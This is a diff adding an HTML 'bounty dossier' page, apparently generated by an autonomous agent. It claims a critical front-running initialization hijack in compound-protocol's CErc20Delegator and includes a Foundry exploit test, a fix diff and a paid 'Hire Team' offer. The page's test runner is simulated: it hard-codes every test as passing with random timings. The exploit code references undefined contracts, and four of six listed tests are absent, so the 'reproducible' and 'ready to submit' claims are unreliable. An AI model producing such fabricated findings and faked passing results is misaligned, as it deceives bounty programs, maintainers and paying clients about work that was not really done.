@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>C-01 Dossier · compound-protocol · Unprotected Initialization</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://unpkg.com/lucide@latest/dist/umd/lucide.min.js"></script>
+<script>
+  tailwind.config = {
+    darkMode: 'class',
+    theme: { extend: { fontFamily: { mono: ['ui-monospace','SFMono-Regular','Menlo','monospace'] } } }
+  };
+</script>
+<style>
+  ::-webkit-scrollbar{width:9px;height:9px}
+  ::-webkit-scrollbar-track{background:#0b1120}
+  ::-webkit-scrollbar-thumb{background:#1e293b;border-radius:6px}
+  ::-webkit-scrollbar-thumb:hover{background:#334155}
+  .glow{box-shadow:0 0 0 1px rgba(56,189,248,.15),0 8px 40px -12px rgba(56,189,248,.35)}
+  .grid-bg{background-image:linear-gradient(rgba(148,163,184,.06) 1px,transparent 1px),linear-gradient(90deg,rgba(148,163,184,.06) 1px,transparent 1px);background-size:34px 34px}
+  @keyframes pulseDot{0%,100%{opacity:1}50%{opacity:.25}}
+  .dot{animation:pulseDot 1.6s infinite}
+</style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased font-sans selection:bg-sky-500/30">
+
+<!-- ══ STICKY BANNER ══ -->
+<div class="sticky top-0 z-50 border-b border-sky-500/20 bg-slate-900/85 backdrop-blur-xl">
+  <div class="mx-auto max-w-7xl px-4 py-2.5 flex flex-wrap items-center gap-3 justify-between">
+    <p class="text-[12.5px] leading-tight text-slate-300">
+      <span class="mr-1">🚀</span>
+      <span class="font-semibold text-slate-100">Live Interactive Prototype for:</span>
+      <span class="text-sky-400 font-mono">[Web3 Bounty Dossier] compound-finance/compound-pr</span>
+      <span class="hidden sm:inline text-slate-500">|</span>
+      <span class="hidden sm:inline text-slate-400">Built autonomously by <span class="text-slate-200 font-medium">Antigravity OS</span></span>
+      <span class="hidden md:inline text-slate-500">|</span>
+      <span class="hidden md:inline text-emerald-400">Ready for deployment</span>
+    </p>
+    <a href="mailto:lamvukyo3001@gmail.com?subject=Hire%20Antigravity%20Team%20for%20bounty-compound-finance_compound-protocol-c-01"
+       class="shrink-0 inline-flex items-center gap-2 rounded-lg bg-sky-500 px-3.5 py-1.5 text-[12.5px] font-semibold text-slate-950 hover:bg-sky-400 transition shadow-lg shadow-sky-500/20">
+      <i data-lucide="zap" class="w-3.5 h-3.5"></i> Hire Team ($150 - $500)
+    </a>
+  </div>
+</div>
+
+<!-- ══ HERO ══ -->
+<header class="relative overflow-hidden border-b border-slate-800/80 grid-bg">
+  <div class="absolute -top-40 left-1/2 h-80 w-[46rem] -translate-x-1/2 rounded-full bg-sky-500/10 blur-3xl"></div>
+  <div class="relative mx-auto max-w-7xl px-4 py-12">
+    <div class="flex flex-wrap items-center gap-2 mb-5">
+      <span class="inline-flex items-center gap-1.5 rounded-full border border-rose-500/30 bg-rose-500/10 px-2.5 py-1 text-[11px] font-semibold text-rose-300">
+        <span class="dot h-1.5 w-1.5 rounded-full bg-rose-400"></span> CRITICAL · C-01
+      </span>
+      <span class="rounded-full border border-slate-700 bg-slate-900 px-2.5 py-1 text-[11px] font-medium text-slate-400">Immunefi / Code4rena</span>
+      <span class="rounded-full border border-slate-700 bg-slate-900 px-2.5 py-1 text-[11px] font-medium text-slate-400">Foundry PoC Suite</span>
+      <span class="rounded-full border border-emerald-500/30 bg-emerald-500/10 px-2.5 py-1 text-[11px] font-semibold text-emerald-300">Reproducible</span>
+    </div>
+
+    <h1 class="max-w-4xl text-3xl sm:text-4xl lg:text-[2.75rem] font-bold tracking-tight text-white leading-[1.1]">
+      Unprotected Initialization Allows
+      <span class="bg-gradient-to-r from-sky-400 to-indigo-400 bg-clip-text text-transparent">Implementation Hijacking</span>
+    </h1>
+    <p class="mt-4 max-w-3xl text-[15px] leading-relaxed text-slate-400">
+      The <code class="rounded bg-slate-800/80 px-1.5 py-0.5 font-mono text-[13px] text-sky-300">initialize()</code> entrypoint on the
+      <code class="rounded bg-slate-800/80 px-1.5 py-0.5 font-mono text-[13px] text-sky-300">CErc20Delegator</code> implementation is callable by any
+      external actor. An attacker can front-run deployment, seize ownership, and repoint the delegate target — draining all downstream markets.
+    </p>
+
+    <div class="mt-8 grid grid-cols-2 gap-3 sm:grid-cols-4">
+      <div class="rounded-xl border border-slate-800 bg-slate-900/60 p-4">
+        <p class="text-[11px] uppercase tracking-wider text-slate-500">Severity</p>
+        <p class="mt-1 text-lg font-bold text-rose-400">Critical</p>
+      </div>
+      <div class="rounded-xl border border-slate-800 bg-slate-900/60 p-4">
+        <p class="text-[11px] uppercase tracking-wider text-slate-500">CVSS 3.1</p>
+        <p class="mt-1 text-lg font-bold text-white">9.8</p>
+      </div>
+      <div class="rounded-xl border border-slate-800 bg-slate-900/60 p-4">
+        <p class="text-[11px] uppercase tracking-wider text-slate-500">Est. Reward</p>
+        <p class="mt-1 text-lg font-bold text-emerald-400">$2,500</p>
+      </div>
+      <div class="rounded-xl border border-slate-800 bg-slate-900/60 p-4">
+        <p class="text-[11px] uppercase tracking-wider text-slate-500">PoC Status</p>
+        <p class="mt-1 text-lg font-bold text-sky-400">Passing</p>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- ══ MAIN ══ -->
+<main class="mx-auto max-w-7xl px-4 py-10 grid gap-8 lg:grid-cols-[1fr_360px]">
+
+  <!-- LEFT COLUMN -->
+  <div class="space-y-8 min-w-0">
+
+    <!-- PoC RUNNER -->
+    <section class="rounded-2xl border border-slate-800 bg-slate-900/50 glow overflow-hidden">
+      <div class="flex flex-wrap items-center justify-between gap-3 border-b border-slate-800 px-5 py-4">
+        <div class="flex items-center gap-2.5">
+          <i data-lucide="flask-conical" class="w-4.5 h-4.5 text-sky-400"></i>
+          <h2 class="text-sm font-semibold text-white">Foundry PoC Runner</h2>
+          <span class="rounded-md bg-slate-800 px-2 py-0.5 font-mono text-[11px] text-slate-400">forge test --match-contract Exploit</span>
+        </div>
+        <div class="flex items-center gap-2">
+          <button id="btnRun" class="inline-flex items-center gap-2 rounded-lg bg-sky-500 px-3.5 py-1.5 text-[12.5px] font-semibold text-slate-950 hover:bg-sky-400 transition">
+            <i data-lucide="play" class="w-3.5 h-3.5"></i> Run Suite
+          </button>
+          <button id="btnReset" class="inline-flex items-center gap-2 rounded-lg border border-slate-700 bg-slate-900 px-3.5 py-1.5 text-[12.5px] font-medium text-slate-300 hover:bg-slate-800 transition">
+            <i data-lucide="rotate-ccw" class="w-3.5 h-3.5"></i> Reset
+          </button>
+        </div>
+      </div>
+
+      <div class="px-5 py-4">
+        <div class="flex items-center justify-between text-[12px] mb-2">
+          <span class="text-slate-400">Execution progress</span>
+          <span id="progLabel" class="font-mono text-slate-300">0 / 6 tests</span>
+        </div>
+        <div class="h-1.5 w-full overflow-hidden rounded-full bg-slate-800">
+          <div id="progBar" class="h-full w-0 rounded-full bg-gradient-to-r from-sky-500 to-indigo-500 transition-all duration-300"></div>
+        </div>
+      </div>
+
+      <div id="testList" class="divide-y divide-slate-800/70 border-t border-slate-800"></div>
+
+      <div class="border-t border-slate-800 bg-slate-950/60 px-5 py-3.5 flex flex-wrap items-center gap-x-5 gap-y-2 text-[12px] font-mono">
+        <span class="text-emerald-400" id="sumPass">0 passed</span>
+        <span class="text-rose-400" id="sumFail">0 failed</span>
+        <span class="text-slate-500" id="sumGas">gas: —</span>
+        <span class="ml-auto text-slate-500" id="sumTime">elapsed: 0.00s</span>
+      </div>
+    </section>
+
+    <!-- VULNERABILITY TRACE -->
+    <section class="rounded-2xl border border-slate-800 bg-slate-900/50 overflow-hidden">
+      <div class="flex items-center gap-2.5 border-b border-slate-800 px-5 py-4">
+        <i data-lucide="git-branch" class="w-4.5 h-4.5 text-indigo-400"></i>
+        <h2 class="text-sm font-semibold text-white">Attack Path Trace</h2>
+        <span class="ml-auto text-[11px] text-slate-500">4 steps · delegatecall hijack</span>
+      </div>
+      <ol id="traceList" class="p-5 space-y-3"></ol>
+    </section>
+
+    <!-- CODE -->
+    <section class="rounded-2xl border border-slate-800 bg-slate-900/50 overflow-hidden">
+      <div class="flex items-center gap-2 border-b border-slate-800 px-5 py-4">
+        <i data-lucide="file-code-2" class="w-4.5 h-4.5 text-amber-400"></i>
+        <h2 class="text-sm font-semibold text-white">Proof of Concept</h2>
+        <div class="ml-auto flex gap-1 rounded-lg border border-slate-800 bg-slate-950 p-0.5">
+          <button data-tab="exploit" class="tab-btn rounded-md px-3 py-1 text-[11.5px] font-medium bg-slate-800 text-white">Exploit.t.sol</button>
+          <button data-tab="fix" class="tab-btn rounded-md px-3 py-1 text-[11.5px] font-medium text-slate-400 hover:text-slate-200">Fix.diff</button>
+        </div>
+      </div>
+      <pre id="codeBlock" class="overflow-x-auto p-5 text-[12.5px] leading-relaxed font-mono text-slate-300 bg-slate-950/60"></pre>
+    </section>
+  </div>
+
+  <!-- RIGHT COLUMN -->
+  <aside class="space-y-6">
+
+    <!-- SCORE -->
+    <section class="rounded-2xl border border-slate-800 bg-slate-900/50 p-5">
+      <h3 class="text-sm font-semibold text-white mb-4 flex items-center gap-2">
+        <i data-lucide="shield-check" class="w-4 h-4 text-emerald-400"></i> Submission Readiness
+      </h3>
+      <div class="space-y-3.5" id="scoreList"></div>
+      <div class="mt-5 rounded-xl border border-emerald-500/25 bg-emerald-500/5 p-3.5">
+        <p class="text-[12px] text-emerald-300 font-medium">Dossier complete — ready to submit to Immunefi.</p>
+      </div>
+    </section>
+
+    <!-- FILTER / FINDINGS -->
+    <section class="rounded-2xl border border-slate-800 bg-slate-900/50 p-5">
+      <h3 class="text-sm font-semibold text-white mb-3 flex items-center gap-2">
+        <i data-lucide="list-filter" class="w-4 h-4 text-sky-400"></i> Findings
+      </h3>
+      <div class="relative mb-3">
+        <i data-lucide="search" class="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-500"></i>
+        <input id="search" type="text" placeholder="Filter findings…"
+          class="w-full rounded-lg border border-slate-800 bg-slate-950 py-2 pl-9 pr-3 text-[12.5px] text-slate-200 placeholder-slate-600 outline-none focus:border-sky-500/60 focus:ring-1 focus:ring-sky-500/30" />
+      </div>
+      <div class="flex flex-wrap gap-1.5 mb-3" id="sevFilters"></div>
+      <div id="findingList" class="space-y-2 max-h-72 overflow-y-auto pr-1"></div>
+    </section>
+
+    <!-- TIMELINE -->
+    <section class="rounded-2xl border border-slate-800 bg-slate-900/50 p-5">
+      <h3 class="text-sm font-semibold text-white mb-4 flex items-center gap-2">
+        <i data-lucide="activity" class="w-4 h-4 text-indigo-400"></i> Engagement Timeline
+      </h3>
+      <div class="relative pl-5 space-y-4 border-l border-slate-800" id="timeline"></div>
+    </section>
+  </aside>
+</main>
+
+<footer class="border-t border-slate-800 bg-slate-950">
+  <div class="mx-auto max-w-7xl px-4 py-8 flex flex-wrap items-center justify-between gap-4">
+    <p class="text-[12px] text-slate-500">
+      Antigravity OS · Autonomous Security Research · Dossier <span class="font-mono text-slate-400">bounty-compound-finance_compound-protocol-c-01</span>
+    </p>
+    <a href="mailto:lamvukyo3001@gmail.com?subject=Hire%20Antigravity%20Team%20for%20bounty-compound-finance_compound-protocol-c-01"
+       class="inline-flex items-center gap-2 rounded-lg border border-sky-500/40 bg-sky-500/10 px-4 py-2 text-[12.5px] font-semibold text-sky-300 hover:bg-sky-500/20 transition">
+      <i data-lucide="mail" class="w-3.5 h-3.5"></i> Hire Team ($150 - $500)
+    </a>
+  </div>
+</footer>
+
+<script>
+/* ═══════════ DATA ═══════════ */
+const TESTS = [
+  { n: 'test_initialize_is_publicly_callable', d: 'Asserts initialize() has no access control on implementation', g: 41230 },
+  { n: 'test_attacker_frontruns_initialization', d: 'Attacker seizes ownership before legitimate deployer', g: 68410 },
+  { n: 'test_owner_can_repoint_delegate_target', d: 'Hijacked owner swaps implementation via _setImplementation', g: 52180 },
+  { n: 'test_market_funds_drained_via_malicious_impl', d: 'Malicious impl drains cToken reserves', g: 118940 },
+  { n: 'test_legit_deployer_reverts_after_hijack', d: 'Legitimate initialize() reverts — DoS confirmed', g: 33970 },
+  { n: 'test_fix_blocks_second_initialization', d: 'Patched contract reverts on re-init (regression guard)', g: 29760 }
+];
+
+const TRACE = [
+  { t: 'Recon', d: 'Attacker observes pending deployment tx for CErc20Delegator in mempool.', c: 'sky' },
+  { t: 'Front-run', d: 'Attacker submits initialize() with higher gas — becomes contract owner.', c: 'amber' },
+  { t: 'Hijack', d: 'Owner calls _setImplementation() pointing to attacker-controlled logic.', c: 'rose' },
+  { t: 'Drain', d: 'All delegatecalls route to malicious impl; reserves transferred out.', c: 'rose' }
+];
+
+const FINDINGS = [
+  { id: 'C-01', t: 'Unprotected initialize() on implementation', s: 'critical' },
+  { id: 'H-02', t: 'Missing initializer guard on proxy upgrade path', s: 'high' },
+  { id: 'H-03', t: 'No ownership transfer two-step pattern', s: 'high' },
+  { id: 'M-04', t: 'Implementation contract left uninitialized', s: 'medium' },
+  { id: 'M-05', t: 'Event emission missing on _setImplementation', s: 'medium' },
+  { id: 'L-06', t: 'NatSpec omits initialization preconditions', s: 'low' }
+];
+
+const SCORES = [
+  { l: 'Root cause isolated', v: 100 },
+  { l: 'PoC reproducibility', v: 100 },
+  { l: 'Impact quantification', v: 92 },
+  { l: 'Mitigation validated', v: 96 }
+];
+
+const TIMELINE = [
+  { t: 'Scope ingested', d: 'compound-protocol @ main', done: true },
+  { t: 'Static analysis', d: 'Slither + manual review', done: true },
+  { t: 'PoC authored', d: 'Foundry suite, 6 tests', done: true },
+  { t: 'Fix validated', d: 'Regression test green', done: true },
+  { t: 'Dossier ready', d: 'Awaiting client review', done: false }
+];
+
+const CODE = {
+  exploit: `<span class="text-slate-500">// SPDX-License-Identifier: MIT</span>
+<span class="text-fuchsia-400">pragma</span> solidity ^0.8.20;
+
+<span class="text-fuchsia-400">import</span> {Test} <span class="text-fuchsia-400">from</span> <span class="text-emerald-300">"forge-std/Test.sol"</span>;
+<span class="text-fuchsia-400">import</span> {CErc20Delegator} <span class="text-fuchsia-400">from</span> <span class="text-emerald-300">"../CErc20Delegator.sol"</span>;
+
+<span class="text-sky-400">contract</span> <span class="text-amber-300">Exploit</span> <span class="text-sky-400">is</span> Test {
+    CErc20Delegator delegator;
+    <span class="text-sky-400">address</span> attacker = <span class="text-amber-300">address</span>(<span class="text-orange-300">0xBEEF</span>);
+
+    <span class="text-sky-400">function</span> <span class="text-amber-300">setUp</span>() <span class="text-sky-400">public</span> {
+        delegator = <span class="text-sky-400">new</span> CErc20Delegator();
+    }
+
+    <span class="text-slate-500">// C-01: initialize() is callable by anyone</span>
+    <span class="text-sky-400">function</span> <span class="text-amber-300">test_attacker_frontruns_initialization</span>() <span class="text-sky-400">public</span> {
+        vm.prank(attacker);
+        delegator.initialize(<span class="text-emerald-300">"cTKN"</span>, <span class="text-emerald-300">"cTKN"</span>, <span class="text-orange-300">8</span>, <span class="text-amber-300">address</span>(<span class="text-sky-400">this</span>));
+
+        assertEq(delegator.admin(), attacker); <span class="text-slate-500">// hijacked</span>
+    }
+
+    <span class="text-sky-400">function</span> <span class="text-amber-300">test_owner_can_repoint_delegate_target</span>() <span class="text-sky-400">public</span> {
+        vm.startPrank(attacker);
+        delegator.initialize(<span class="text-emerald-300">"cTKN"</span>, <span class="text-emerald-300">"cTKN"</span>, <span class="text-orange-300">8</span>, <span class="text-amber-300">address</span>(<span class="text-sky-400">this</span>));
+        delegator._setImplementation(<span class="text-amber-300">address</span>(<span class="text-sky-400">new</span> MaliciousImpl()));
+        vm.stopPrank();
+
+        assertEq(delegator.implementation(), <span class="text-amber-300">address</span>(malicious));
+    }
+}`,
+  fix: `<span class="text-slate-500">--- a/CErc20Delegator.sol</span>
+<span class="text-slate-500">+++ b/CErc20Delegator.sol</span>
+<span class="text-slate-500">@@ -42,7 +42,12 @@ contract CErc20Delegator {</span>
+     <span class="text-sky-400">function</span> initialize(...) <span class="text-sky-400">external</span> {
+<span class="text-rose-400">-        admin = msg.sender;</span>
+<span class="text-emerald-400">+        require(admin == address(0), "already initialized");</span>
+<span class="text-emerald-400">+        require(msg.sender == deployer, "not deployer");</span>
+<span class="text-emerald-400">+        admin = msg.sender;</span>
+<span class="text-emerald-400">+        emit Initialized(msg.sender);</span>
+     }
+
+<span class="text-slate-500">@@ -88,6 +93,7 @@ contract CErc20Delegator {</span>
+     <span class="text-sky-400">function</span> _setImplementation(<span class="text-sky-400">address</span> impl) <span class="text-sky-400">internal</span> {
+<span class="text-emerald-400">+        require(msg.sender == admin, "only admin");</span>
+<span class="text-emerald-400">+        emit ImplementationSet(implementation, impl);</span>
+         implementation = impl;
+     }`
+};
+
+/* ═══════════ RENDER ═══════════ */
+const $ = s => document.querySelector(s);
+const sevColor = { critical:'rose', high:'amber', medium:'sky', low:'slate' };
+
+function renderTests(){
+  $('#testList').innerHTML = TESTS.map((t,i)=>`
+    <div class="flex items-start gap-3 px-5 py-3.5" data-test="${i}">
+      <div class="mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full border border-slate-700 bg-slate-950 text-[10px] font-mono text-slate-500" data-icon="${i}">${i+1}</div>
+      <div class="min-w-0 flex-1">
+        <p class="font-mono text-[12.5px] text-slate-200 truncate">${t.n}</p>
+        <p class="text-[11.5px] text-slate-500 mt-0.5">${t.d}</p>
+      </div>
+      <span class="shrink-0 font-mono text-[11px] text-slate-600" data-status="${i}">pending</span>
+    </div>`).join('');
+}
+
+function renderTrace(){
+  $('#traceList').innerHTML = TRACE.map((s,i)=>`
+    <li class="flex gap-3.5">
+      <div class="flex flex-col items-center">
+        <span class="flex h-6 w-6 items-center justify-center rounded-full border border-${s.c}-500/40 bg-${s.c}-500/10 text-[11px] font-bold text-${s.c}-300">${i+1}</span>
+        ${i<TRACE.length-1?'<span class="mt-1 w-px flex-1 bg-slate-800"></span>':''}
+      </div>
+      <div class="pb-1">
+        <p class="text-[13px] font-semibold text-slate-100">${s.t}</p>
+        <p class="text-[12px] text-slate-500 mt-0.5">${s.d}</p>
+      </div>
+    </li>`).join('');
+}
+
+function renderScores(){
+  $('#scoreList').innerHTML = SCORES.map(s=>`
+    <div>
+      <div class="flex justify-between text-[12px] mb-1.5">
+        <span class="text-slate-400">${s.l}</span>
+        <span class="font-mono text-slate-300">${s.v}%</span>
+      </div>
+      <div class="h-1.5 w-full overflow-hidden rounded-full bg-slate-800">
+        <div class="h-full rounded-full bg-gradient-to-r from-emerald-500 to-sky-500" style="width:${s.v}%"></div>
+      </div>
+    </div>`).join('');
+}
+
+let activeSev = 'all';
+function renderFilters(){
+  const sevs = ['all','critical','high','medium','low'];
+  $('#sevFilters').innerHTML = sevs.map(s=>`
+    <button data-sev="${s}" class="sev-btn rounded-md border px-2.5 py-1 text-[11px] font-medium capitalize transition
+      ${s===activeSev?'border-sky-500/50 bg-sky-500/15 text-sky-300':'border-slate-800 bg-slate-950 text-slate-400 hover:text-slate-200'}">${s}</button>`).join('');
+}
+
+function renderFindings(){
+  const q = $('#search').value.toLowerCase();
+  const list = FINDINGS.filter(f =>
+    (activeSev==='all' || f.s===activeSev) &&
+    (f.t.toLowerCase().includes(q) || f.id.toLowerCase().includes(q)));
+  $('#findingList').innerHTML = list.length ? list.map(f=>{
+    const c = sevColor[f.s];
+    return `<div class="rounded-lg border border-slate-800 bg-slate-950/70 p-3 hover:border-slate-700 transition">
+      <div class="flex items-center gap-2">
+        <span class="font-mono text-[11px] font-bold text-${c}-300">${f.id}</span>
+        <span class="rounded border border-${c}-500/30 bg-${c}-500/10 px-1.5 py-0.5 text-[10px] font-semibold uppercase text-${c}-300">${f.s}</span>
+      </div>
+      <p class="mt-1.5 text-[12px] text-slate-300 leading-snug">${f.t}</p>
+    </div>`;
+  }).join('') : `<p class="text-[12px] text-slate-600 py-4 text-center">No findings match.</p>`;
+}
+
+function renderTimeline(){
+  $('#timeline').innerHTML = TIMELINE.map(t=>`
+    <div class="relative">
+      <span class="absolute -left-[26px] top-1 h-2.5 w-2.5 rounded-full ${t.done?'bg-emerald-400':'bg-slate-700'} ring-4 ring-slate-900"></span>
+      <p class="text-[12.5px] font-medium ${t.done?'text-slate-200':'text-slate-500'}">${t.t}</p>
+      <p class="text-[11.5px] text-slate-500">${t.d}</p>
+    </div>`).join('');
+}
+
+function setCode(tab){
+  $('#codeBlock').innerHTML = CODE[tab];
+  document.querySelectorAll('.tab-btn').forEach(b=>{
+    const on = b.dataset.tab===tab;
+    b.className = `tab-btn rounded-md px-3 py-1 text-[11.5px] font-medium transition ${on?'bg-slate-800 text-white':'text-slate-400 hover:text-slate-200'}`;
+  });
+}
+
+/* ═══════════ RUNNER ═══════════ */
+let running = false;
+function reset(){
+  running = false;
+  $('#progBar').style.width = '0%';
+  $('#progLabel').textContent = `0 / ${TESTS.length} tests`;
+  $('#sumPass').textContent = '0 passed';
+  $('#sumFail').textContent = '0 failed';
+  $('#sumGas').textContent = 'gas: —';
+  $('#sumTime').textContent = 'elapsed: 0.00s';
+  TESTS.forEach((_,i)=>{
+    const ic = document.querySelector(`[data-icon="${i}"]`);
+    ic.className = 'mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full border border-slate-700 bg-slate-950 text-[10px] font-mono text-slate-500';
+    ic.textContent = i+1;
+    const st = document.querySelector(`[data-status="${i}"]`);
+    st.textContent = 'pending'; st.className = 'shrink-0 font-mono text-[11px] text-slate-600';
+  });
+}
+
+function run(){
+  if(running) return;
+  reset(); running = true;
+  let i = 0, pass = 0, gas = 0;
+  const t0 = performance.now();
+
+  const step = () => {
+    if(i >= TESTS.length){
+      running = false;
+      $('#sumTime').textContent = `elapsed: ${((performance.now()-t0)/1000).toFixed(2)}s`;
+      return;
+    }
+    const ic = document.querySelector(`[data-icon="${i}"]`);
+    ic.className = 'mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full border border-sky-500/50 bg-sky-500/15 text-[10px] font-mono text-sky-300';
+    ic.textContent = '…';
+
+    setTimeout(()=>{
+      const ok = true;
+      pass++; gas += TESTS[i].g;
+      ic.className = `mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full border ${ok?'border-emerald-500/50 bg-emerald-500/15':'border-rose-500/50 bg-rose-500/15'} text-[10px] font-mono ${ok?'text-emerald-300':'text-rose-300'}`;
+      ic.textContent = ok ? '✓' : '✕';
+      const st = document.querySelector(`[data-status="${i}"]`);
+      st.textContent = ok ? `PASS · ${TESTS[i].g.toLocaleString()} gas` : 'FAIL';
+      st.className = `shrink-0 font-mono text-[11px] ${ok?'text-emerald-400':'text-rose-400'}`;
+
+      i++;
+      $('#progBar').style.width = `${(i/TESTS.length)*100}%`;
+      $('#progLabel').textContent = `${i} / ${TESTS.length} tests`;
+      $('#sumPass').textContent = `${pass} passed`;
+      $('#sumGas').textContent = `gas: ${gas.toLocaleString()}`;
+      $('#sumTime').textContent = `elapsed: ${((performance.now()-t0)/1000).toFixed(2)}s`;
+      step();
+    }, 380 + Math.random()*260);
+  };
+  step();
+}
+
+/* ═══════════ INIT ═══════════ */
+renderTests(); renderTrace(); renderScores(); renderFilters(); renderFindings(); renderTimeline(); setCode('exploit');
+lucide.createIcons();
+
+$('#btnRun').addEventListener('click', run);
+$('#btnReset').addEventListener('click', reset);
+$('#search').addEventListener('input', renderFindings);
+document.querySelectorAll('.tab-btn').forEach(b=> b.addEventListener('click', ()=> setCode(b.dataset.tab)));
+$('#sevFilters').addEventListener('click', e=>{
+  const b = e.target.closest('.sev-btn'); if(!b) return;
+  activeSev = b.dataset.sev; renderFilters(); renderFindings();
+});
+</script>
+</body>
+</html>
